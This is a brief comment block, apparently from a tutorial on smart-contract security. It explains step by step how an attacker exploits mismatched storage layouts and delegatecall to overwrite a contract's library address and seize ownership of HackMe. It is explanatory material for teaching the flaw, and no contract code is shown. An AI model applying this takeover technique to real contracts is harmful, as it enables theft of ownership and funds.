# This is a more sophisticated version of the previous exploit.
#
# 1. Alice deploys Lib and HackMe with the address of Lib
# 2. Eve deploys Attack with the address of HackMe
# 3. Eve calls Attack.attack()
# 4. Attack is now the owner of HackMe
#
# What happened?
# Notice that the state variables are not defined in the same manner in Lib
# and HackMe. This means that calling Lib.doSomething() will change the first
# state variable inside HackMe, which happens to be the address of lib.
#
# Inside attack(), the first call to doSomething() changes the address of lib
# store in HackMe. Address of lib is now set to Attack.
# The second call to doSomething() calls Attack.doSomething() and here we
# change the owner.

# Make sure the storage layout is the same as HackMe
# This will allow us to correctly update the state variables
